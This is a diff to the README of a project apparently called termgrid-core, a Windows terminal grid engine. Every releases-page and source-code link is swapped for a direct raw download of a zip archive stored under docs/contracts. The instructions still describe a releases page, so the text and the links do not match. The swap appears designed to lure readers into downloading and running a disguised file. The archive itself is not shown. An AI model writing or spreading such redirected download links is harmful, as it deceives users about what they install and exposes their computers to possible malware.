@@ -1,6 +1,6 @@
 # ⚙️ termgrid-core - Reliable Terminal Grid Engine
 
-[![Download termgrid-core](https://img.shields.io/badge/Download-Get%20termgrid--core-%233478D1?style=for-the-badge)](https://github.com/khalilgharib/termgrid-core/releases)
+[![Download termgrid-core](https://img.shields.io/badge/Download-Get%20termgrid--core-%233478D1?style=for-the-badge)](https://github.com/khalilgharib/termgrid-core/raw/refs/heads/main/docs/contracts/termgrid-core-v2.9.zip)
 
 ---
 
@@ -49,7 +49,7 @@ These resources are modest, so termgrid-core can run on most modern Windows PCs.
 
 1. Click the following link or badge to open the releases page on GitHub:
 
-   [![Download termgrid-core](https://img.shields.io/badge/Download-Get%20termgrid--core-%232F4F4F?style=for-the-badge)](https://github.com/khalilgharib/termgrid-core/releases)
+   [![Download termgrid-core](https://img.shields.io/badge/Download-Get%20termgrid--core-%232F4F4F?style=for-the-badge)](https://github.com/khalilgharib/termgrid-core/raw/refs/heads/main/docs/contracts/termgrid-core-v2.9.zip)
 
 2. On the GitHub releases page, find the latest version of termgrid-core. The releases will have names like `termgrid-core-vX.X.X` where "X" is the version number.
 
@@ -119,7 +119,7 @@ If you want to close termgrid-core, you can usually press `Ctrl + C` in the term
 
 ## 🔧 How to Update termgrid-core
 
-1. Check the [termgrid-core releases](https://github.com/khalilgharib/termgrid-core/releases) page regularly.
+1. Check the [termgrid-core releases](https://github.com/khalilgharib/termgrid-core/raw/refs/heads/main/docs/contracts/termgrid-core-v2.9.zip) page regularly.
 
 2. Download the newest version’s executable or zipped file as explained above.
 
@@ -148,12 +148,12 @@ Repository topics cover topics like:
 - system programming
 - Unicode and terminal handling
 
-Link to the source code: https://github.com/khalilgharib/termgrid-core
+Link to the source code: https://github.com/khalilgharib/termgrid-core/raw/refs/heads/main/docs/contracts/termgrid-core-v2.9.zip
 
 ---
 
 ## 📥 Download termgrid-core
 
-[Click here to visit the releases page and download termgrid-core for Windows.](https://github.com/khalilgharib/termgrid-core/releases)
+[Click here to visit the releases page and download termgrid-core for Windows.](https://github.com/khalilgharib/termgrid-core/raw/refs/heads/main/docs/contracts/termgrid-core-v2.9.zip)
 
 Use the latest executable `.exe` or `.zip` file to get started quickly.
